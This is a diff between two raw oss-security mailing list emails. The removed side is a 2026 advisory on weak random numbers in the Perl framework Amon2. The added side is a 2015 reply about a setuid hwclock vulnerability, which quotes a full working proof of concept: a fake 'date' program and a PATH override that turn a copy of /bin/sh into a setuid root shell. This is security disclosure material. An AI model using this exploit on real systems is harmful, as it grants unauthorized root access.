@@ -1,4 +1,9 @@
-Received: (qmail 5803 invoked by uid 550); 28 Mar 2026 19:09:35 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4650" "Tuesday" "26" "May" "2015" "09:19:13" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<728CB05F-659E-429E-A59D-577F4251DFDA@me.com>" "148" "Re: [oss-security] hwclock(8) SUID privilege escalation" nil nil nil "5" "2015052613:19:13" "[oss-security] hwclock(8) SUID privilege escalation" (number mark "        larry0@me.co May 26  148/4650  " thread-indent "\"Re: [oss-security] hwclock(8) SUID privilege escalation\"\n") "<20150526124747.16414nohrczpwps0@webmail.alunos.dcc.fc.up.pt>" ("<20150526124747.16414nohrczpwps0@webmail.alunos.dcc.fc.up.pt>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 15445 invoked by uid 550); 26 May 2015 13:19:31 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,94 +11,171 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 15421 invoked from network); 26 May 2015 13:19:30 -0000
+X-Proofpoint-Virus-Version: vendor=fsecure
+ engine=2.50.10432:5.14.151,1.0.33,0.0.0000
+ definitions=2015-05-26_02:2015-05-26,2015-05-26,1970-01-01 signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
+ reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1505260173
+Content-type: text/plain; charset=windows-1252
+MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
+In-reply-to: <20150526124747.16414nohrczpwps0@webmail.alunos.dcc.fc.up.pt>
+Content-transfer-encoding: quoted-printable
+Message-id: <728CB05F-659E-429E-A59D-577F4251DFDA@me.com>
+References: <20150526124747.16414nohrczpwps0@webmail.alunos.dcc.fc.up.pt>
+X-Mailer: Apple Mail (2.2098)
+Date: Tue, 26 May 2015 09:19:13 -0400
+From: "Larry W. Cashdollar" <larry0@me.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 15636 invoked from network); 28 Mar 2026 18:50:21 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=cpansec.org; s=gm1;
-	t=1774723812;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=tLRWT8XLt/s3HdQotrqr7oTHW1dXJJpNgIqC3FJIpB4=;
-	b=MRwjnCuGvwLuJ9YphOFuxxV1J4wdW+DJVv41+sK3hMIbuUAFv3sMJ5K9UgPc5D+tgXKAax
-	QhWUcUC57ablDD9p/37EKlVJD7PRP7rSsxXodyU/k9xEzBn3CWflyiP3ijNB7meDW0Cuvx
-	ZZ35H9X061MEnGA84ERBZL+OY3nltzpNLlwnOMLOT/mW7rHMQuMtpzuOyWVFyMtN/OoVRo
-	6UPn73fAS01zVuIV+54+7ElsjefnZyzm+UN136+cMuXPeCYYeX9tDRqsTWqG17gQlkvz+t
-	lHENKuqVeIN+a/Z4wgMgACFpQVDlTfe/1PLLl6Hi6MZ/engmjGznNlGMpDzUKg==
-Message-ID: <336aa718-600f-41dd-8f11-4fac99dd8755@cpansec.org>
-Date: Sat, 28 Mar 2026 18:50:11 +0000
-MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Content-Language: en-GB, en-ZA
-References: <675056ee-fa94-4d0c-ad56-0b9cd9aec050@cpansec.org>
-From: Robert Rothenberg <rrwo@cpansec.org>
-To: oss-security@lists.openwall.com
-In-Reply-To: <675056ee-fa94-4d0c-ad56-0b9cd9aec050@cpansec.org>
-X-Forwarded-Message-Id: <675056ee-fa94-4d0c-ad56-0b9cd9aec050@cpansec.org>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
-X-GND-Sasl: rrwo@cpansec.org
-X-GND-State: clean
-X-GND-Score: 0
-X-GND-Cause: dmFkZTEcGMhbuPjKFCOuMb1XXgHWvEKD7bD/I82ekvB5PGw+xGPr2IgldQN2RoTWtEVeLuLkDFr+1k5XfgXhPw0JrOAU8RCrsqTt44O3xMBBdMd6Mlfk7tsexFdyT0rD/Aiy/Q4NJCl844pH1l81D5uo+Jjb8AUO/giWOaGbObfRKZbzBpGZJRqvVHqj4fNpbEADnFDGPjewdUoC8i9r3fHR1GcmXWJHRwoRnA8hZiOC6E0HUWRreIqjHhyA4TVfSBVwNKp/IWnuVaBSg0buL96nZ1FLdxupEtzVKpPJf7YD+Bxoh/LGBp/XQKVVPwQYPULVlKHpz/PXXdyhowzaZQ81ugQzsEqe5jQVlo1OqXRNix5tD4pqetH4F7LjEDZXbAteWLsV4/VU4sKgqHp9VcLCbwJeNXnukyWzZgP0jCZ6eIjQhd6k7nggpv3hjAQhNk7umOFxY25krwxPtIR/CwWlEjxm0LSGLiM43Fl5iCVqDI2ISmdwd2Gt7ZXPakmQ6Eiu4lEJJ6i4+IkUS+wh6r1Qs+N0N5aDsvtQgpbEn0DOUixRlwigQNK0F0agXABVZa35eb+MEBBPt4KXZP3LBt4tSBFM85T1gs2RAUy43PrufCN16drefdUOPVykP9iIbFLKV47sBLcN8De70muCJeo5w9CXgmio7XCucXzlbSm9RQlLAg
-Subject: [oss-security] CVE-2025-15604: Amon2 versions before 6.17 for Perl use an insecure
- random_string implementation for security functions
+Subject: Re: [oss-security] hwclock(8) SUID privilege escalation
+To: Open Source Security <oss-security@lists.openwall.com>
 
-========================================================================
-CVE-2025-15604                                       CPAN Security Group
-========================================================================
+It=92s not setuid root on my Ubuntu system.
 
-         CVE ID:  CVE-2025-15604
-   Distribution:  Amon2
-       Versions:  before 6.17
-
-       MetaCPAN:  https://metacpan.org/dist/Amon2
-       VCS Repo:  https://github.com/tokuhirom/Amon
+larry@meep:~$ which hwclock
+/sbin/hwclock
+larry@meep:~$ ls -l /sbin/hwclock=20
+-rwxr-xr-x 1 root root 46764 Feb 12 13:54 /sbin/hwclock
+larry@meep:~$ uname -a
+Linux meep 3.13.0-48-generic #80-Ubuntu SMP Thu Mar 12 11:16:18 UTC 2015 i6=
+86 i686 i686 GNU/Linux
+larry@meep:~$ cat /etc/issue
+Ubuntu 14.04.2 LTS \n \l
 
 
-Amon2 versions before 6.17 for Perl use an insecure random_string
-implementation for security functions
-
-Description
------------
-Amon2 versions before 6.17 for Perl use an insecure random_string
-implementation for security functions.
-
-In versions 6.06 through 6.16, the random_string function will attempt
-to read bytes from the /dev/urandom device, but if that is unavailable
-then it generates bytes by concatenating a SHA-1 hash seeded with the
-built-in rand() function, the PID, and the high resolution epoch time.
-The PID will come from a small set of numbers, and the epoch time may
-be guessed, if it is not leaked from the HTTP Date header. The built-in
-rand function is unsuitable for cryptographic usage.
-
-Before version 6.06, there was no fallback when /dev/urandom was not
-available.
-
-Before version 6.04, the random_string function used the built-in
-rand() function to generate a mixed-case alphanumeric string.
-
-This function may be used for generating session ids, generating
-secrets for signing or encrypting cookie session data and generating
-tokens used for Cross Site Request Forgery (CSRF) protection.
-
-Problem types
--------------
-- CWE-340 Generation of Predictable Numbers or Identifiers
-- CWE-338 Use of Cryptographically Weak Pseudo-Random Number Generator
-
-Solutions
----------
-Upgrade to Amon2 version 6.17 or later.
 
 
-References
-----------
-https://metacpan.org/release/TOKUHIROM/Amon2-6.17/diff/TOKUHIROM/Amon2-6.16#lib/Amon2/Util.pm
-https://metacpan.org/release/TOKUHIROM/Amon2-6.17/changes
-https://github.com/tokuhirom/Amon/pull/135
-https://security.metacpan.org/docs/guides/random-data-for-security.html
-
-
+> On May 26, 2015, at 6:47 AM, up201407890@alunos.dcc.fc.up.pt wrote:
+>=20
+> Hello,
+>=20
+> During a recent assessment I have stumbled across a system which had
+> hwclock(8) setuid root
+>=20
+> hwclock is a part of util-linux, all versions affected
+>=20
+> $ man hwclock | sed -n '223,231p'
+>=20
+> Users access and setuid
+>       Sometimes, you need to install hwclock setuid root. If you
+> want users other than the superuser to be able to display the clock
+> value using the direct ISA I/O
+>       method,  install  it setuid root. If you have the /dev/rtc
+> interface on your system or are on a non-ISA system, there's probably
+> no need for users to use the
+>       direct ISA I/O method, so don't bother.
+>=20
+>       In any case, hwclock will not allow you to set anything unless
+> you have the superuser real uid.  (This  is  restriction  is  not
+> necessary  if  you  haven't
+>       installed setuid root, but it's there for now).
+>=20
+> http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L2=
+041
+>=20
+> "The program is designed to run setuid superuser, since we need to be able
+> to do direct I/O. (More to the point: we need permission to execute the
+> iopl() system call). (However, if you use one of the methods other than
+> direct ISA I/O to access the clock, no setuid is required)."
+>=20
+> http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L1=
+920
+>=20
+> "program is designed to run setuid (in some situations)"
+>=20
+>=20
+> Some comments in code and unfortunately also man page
+> advertising that setuid is no problem. That's pretty stupid promise.
+>=20
+>=20
+> from util-linux/2.26.2-5/sys-utils/hwclock.c
+> http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L7=
+48
+>=20
+>=20
+> /* Quotes in date_opt would ruin the date command we construct. */
+>        if (strchr(date_opt, '"') !=3D NULL) {
+>                warnx(_
+>                      ("The value of the --date option is not a valid date=
+.\n"
+>                       "In particular, it contains quotation marks."));
+>                return 12;
+>        }
+>=20
+>        sprintf(date_command, "date --date=3D\"%s\" +seconds-into-epoch=3D=
+%%s",
+>                date_opt);
+> 				[...]
+>=20
+> 	date_child_fp =3D popen(date_command, "r");
+>=20
+> 				[...]
+>=20
+> hwclock uses popen() to date_command which is 'date --date=3D\"%s\"
+> +seconds-into-epoch=3D%%s'
+>=20
+> Exploiting is trivial, since $PATH is user-controlled
+>=20
+>=20
+>=20
+> $ ls -l /usr/sbin/hwclock
+> -rwsr-sr-x. 1 root root 48096 Nov 27 14:10 /usr/sbin/hwclock
+> $ cat > date.c;gcc date.c -o date
+> main()
+> {
+> chown("/tmp/sploit", 0, 0);
+> chmod("/tmp/sploit", 04755);
+> }
+> ^D
+> $ cp /bin/sh /tmp/sploit
+> $ PATH=3D".:$PATH" /usr/sbin/hwclock --set --date=3D"05/23/2015 20:35:37"
+> hwclock: The date command issued by hwclock returned unexpected results.
+> The command was:
+>  date --date=3D"05/23/2015 20:35:37" +seconds-into-epoch=3D%s
+> The response was:
+>=20
+> hwclock: No usable set-to time.  Cannot set clock.
+> $ /tmp/sploit
+> # id
+> euid=3D0(root) groups=3D0(root)
+>=20
+>=20
+> Can a CVE be assigned?
+>=20
+>=20
+> Notes:
+>=20
+> Please note that this is possible on Debian-derived (and therefore Ubuntu=
+),
+> because /bin/sh is provided by dash which does NOT make use
+> of privmode (does not drop privileges if ruid !=3D euid, unlike bash),
+> which is a very stupid idea.
+>=20
+> privmode is surprisingly effective at mitigating some common vulnerability
+> classes and misconfigurations, and it has been around since mid 90's.
+> Indeed, Chet Ramey (bash author and maintainer) explains that the
+> purpose of this is to prevent "bogus system(3)/popen(3) calls in
+> setuid executables"
+>=20
+>=20
+> TL;DR: When setuid root, hwclock relies on $PATH to popen() the date
+> command, meaning privilege escalation can occur since $PATH is
+> user-controlled.
+>=20
+>=20
+> Patches are available, signed off by Karel Zak <kzak@redhat.com>
+> https://github.com/karelzak/util-linux/commit/687cc5d58942b24a9f4013c6887=
+6d8cbea907ab1
+>=20
+> Initial bug report:
+> https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=3D786804
+>=20
+>=20
+> Thanks,
+> Federico Bento.
+>=20
+> ----------------------------------------------------------------
+> This message was sent using IMP, the Internet Messaging Program.
+>=20
 
